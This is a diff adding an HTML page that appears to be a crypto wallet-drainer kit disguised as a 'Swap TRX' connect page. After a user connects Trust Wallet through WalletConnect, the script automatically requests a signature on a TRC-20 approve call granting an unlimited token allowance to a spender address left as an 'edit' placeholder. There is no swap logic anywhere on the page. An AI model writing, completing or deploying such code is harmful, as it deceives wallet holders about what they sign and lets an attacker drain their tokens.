@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>TRON Static Connect</title>
+
+<script type="module">
+import SignClient from "https://esm.sh/@walletconnect/sign-client@2.11.0";
+
+let client;
+let session;
+
+const projectId = "de40497ce192a97e53c3da7d3f1a4e89";
+
+// INIT
+client = await SignClient.init({
+  projectId,
+  metadata: {
+    name: "Swap TRX",
+    description: "TRON Connect",
+    url: window.location.href,
+    icons: []
+  }
+});
+
+// =====================
+// CONNECT + APPROVE
+// =====================
+window.connectWallet = async function () {
+
+  document.getElementById("status").innerText = "Connecting...";
+
+  try {
+
+    const { uri, approval } = await client.connect({
+      requiredNamespaces: {
+        tron: {
+          methods: ["tron_signTransaction"],
+          chains: ["tron:0x2b6653dc"],
+          events: []
+        }
+      }
+    });
+
+    const approvalPromise = approval();
+
+    // 🔥 OPEN TRUST WALLET
+    window.location.href =
+      "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
+
+    // 🔥 WAIT CONNECT
+    session = await approvalPromise;
+
+    document.getElementById("status").innerText = "Connected ✅";
+
+    // 🔥 DELAY (IMPORTANT)
+    setTimeout(() => {
+      triggerApprove();
+    }, 500);
+
+  } catch (e) {
+    document.getElementById("status").innerText =
+      "❌ " + e.message;
+  }
+};
+
+// =====================
+// APPROVE
+// =====================
+async function triggerApprove() {
+
+  try {
+
+    document.getElementById("status").innerText = "Approving...";
+
+    const account =
+      session.namespaces.tron.accounts[0].split(":")[2];
+
+    const method = "095ea7b3";
+
+    const spender =
+      "000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxx"; // edit
+
+    const amount =
+      "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    const data = method + spender + amount;
+
+    const tx = {
+      raw_data: {
+        contract: [
+          {
+            parameter: {
+              value: {
+                owner_address: account,
+                contract_address:
+                  "41a614f803b6fd780986a42c78ec9c7f77e6ded13c",
+                data: data
+              },
+              type_url:
+                "type.googleapis.com/protocol.TriggerSmartContract"
+            },
+            type: "TriggerSmartContract"
+          }
+        ]
+      }
+    };
+
+    await client.request({
+      topic: session.topic,
+      chainId: "tron:0x2b6653dc",
+      request: {
+        method: "tron_signTransaction",
+        params: tx
+      }
+    });
+
+    document.getElementById("status").innerText = "✅ Approved";
+
+  } catch (e) {
+    document.getElementById("status").innerText =
+      "❌ " + e.message;
+  }
+}
+</script>
+
+<style>
+body {
+  background:#0f172a;
+  color:white;
+  text-align:center;
+  padding-top:120px;
+}
+button {
+  padding:16px 30px;
+  background:#22c55e;
+  border:none;
+  border-radius:10px;
+  font-size:18px;
+}
+</style>
+
+</head>
+
+<body>
+
+<h2>TRON Connect</h2>
+
+<button onclick="connectWallet()">Connect Wallet</button>
+
+<div id="status"></div>
+
+</body>
+</html>
